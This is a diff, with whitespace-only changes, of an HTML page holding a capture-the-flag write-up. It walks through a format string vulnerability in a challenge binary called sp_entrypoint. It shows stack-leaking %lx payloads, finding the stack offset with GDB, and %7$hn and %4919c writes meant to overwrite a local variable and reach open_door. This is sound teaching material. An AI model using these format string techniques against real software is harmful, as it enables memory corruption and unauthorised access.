@@ -149,7 +149,7 @@ RUNPATH:  <span class=code-dark-red>b'./glibc/'</span>
 <span class=mtk1>  } </span><span class=mtk5>else</span><span class=mtk1> {</span>
 <span class=mtk1>    </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk5>&amp;</span><span class=mtk1>DAT_001026a0, </span><span class=mtk5>&amp;</span><span class=mtk1>DAT_0010259a);</span>
 <span class=mtk1>  }</span>
-</code></pre></div><p>Here we have a Format String vulnerability, since <code>printf</code> uses as first argument the same information we provide as &ldquo;card&rsquo;s serial number&rdquo;. A simple proof of concept:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./sp_entrypoint</span>  
+</code></pre></div><p>Here we have a Format String vulnerability, since <code>printf</code> uses as first argument the same information we provide as &ldquo;card&rsquo;s serial number&rdquo;. A simple proof of concept:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./sp_entrypoint</span>
 ...
 <span class=code-yellow>1. Scan card 💳</span>
 <span class=code-yellow>2. Insert password </span>
@@ -163,7 +163,7 @@ RUNPATH:  <span class=code-dark-red>b'./glibc/'</span>
 
 
 <span class=code-red>[-] Invalid password! Intruder detected! 🚨 🚨</span>  
-</code></pre></div><p>The value <code>eb7a7420</code> is a value taken from the stack, so we can potentially read and write values to the stack using the Format String vulnerability.</p><p>Here, if <code>local_48</code> had a value of <code>0xdead1337</code>, then <code>open_door</code> would be called. Unfortunately, <code>local_48</code> is set to <code>0xdeadbeef</code>, so it is different.</p><p>But we can use the Format String vulnerability to modify the value of that local variable. Let&rsquo;s find the offset in the stack where <code>local_48</code> is stored:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./sp_entrypoint</span>  
+</code></pre></div><p>The value <code>eb7a7420</code> is a value taken from the stack, so we can potentially read and write values to the stack using the Format String vulnerability.</p><p>Here, if <code>local_48</code> had a value of <code>0xdead1337</code>, then <code>open_door</code> would be called. Unfortunately, <code>local_48</code> is set to <code>0xdeadbeef</code>, so it is different.</p><p>But we can use the Format String vulnerability to modify the value of that local variable. Let&rsquo;s find the offset in the stack where <code>local_48</code> is stored:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./sp_entrypoint</span>
 ...
 <span class=code-green>1. Scan card 💳</span>
 <span class=code-green>2. Insert password </span>
@@ -175,8 +175,8 @@ RUNPATH:  <span class=code-dark-red>b'./glibc/'</span>
 
 <span class=code-green>Your card is: 7ffed66b4cf0.7f61975088c0.0.f.0.deadbeef.7ffed66b7390.2e786c252e786c25</span>  
 
-<span class=code-red>[-] Invalid password! Intruder detected! 🚨 🚨</span>  
-</code></pre></div><p>It appears to be at position 6. Let&rsquo;s verify it using <code>%6$lx</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./sp_entrypoint</span>  
+<span class=code-red>[-] Invalid password! Intruder detected! 🚨 🚨</span>
+</code></pre></div><p>It appears to be at position 6. Let&rsquo;s verify it using <code>%6$lx</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./sp_entrypoint</span>
 ...
 <span class=code-cyan>1. Scan card 💳</span>
 <span class=code-cyan>2. Insert password </span>
@@ -189,7 +189,7 @@ RUNPATH:  <span class=code-dark-red>b'./glibc/'</span>
 <span class=code-cyan>Your card is: deadbeef
 
 
-<span class=code-red>[-] Invalid password! Intruder detected! 🚨 🚨</span>    
+<span class=code-red>[-] Invalid password! Intruder detected! 🚨 🚨</span>  
 </code></pre></div><p>Alright. Now we must use format <code>%n</code> (for example, <code>%6$n</code>) in order to write data into memory. The way <code>%6$n</code> works is that it stores the number of characters printed until <code>%6$n</code> into the address at the sixth position in the stack.</p><p>For this reason, we can&rsquo;t use <code>%6$n</code>, because <code>0xdeadbeef</code> is not a valid address. We must find the address that contains <code>0xdeafbeef</code>. Let&rsquo;s use GDB to find it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q <span class=mtku>sp_entrypoint</span>
 <span class=code-dark-green>GEF</span> for linux ready, type `[0;33;4mgef</span>' to start, `[0;4;35mgef config</span>' to configure  
 <span class=code-green>96</span> commands loaded for GDB <span class=code-yellow>9.2</span> using Python engine <span class=code-red>3.8</span>
@@ -219,7 +219,7 @@ Insert card's serial number%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.
 
 Your card is: 7fffffffbfb0.7ffff7dcf8c0.0.f.0.deadbeef.7fffffffe650.2e786c252e786c25  
 
-<span class=code-red>[-] Invalid password! Intruder detected! 🚨 🚨</span>  
+<span class=code-red>[-] Invalid password! Intruder detected! 🚨 🚨</span>
 [Inferior 1 (process 76812) exited normally]
 </code></pre></div><p>Ok, we need to write into position 7, so we will be using <code>%7$n</code>.</p><p>Actually, we can use <code>%7$hn</code> to overwrite half word (2 bytes), because it is what we need in this situation. In order to print <code>0x1337</code> (4919) bytes, we can use another format string, that is <code>%4919c</code>. Let&rsquo;s try:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>1. Scan card 💳</span>
 <span class=code-cyan>2. Insert password </span>
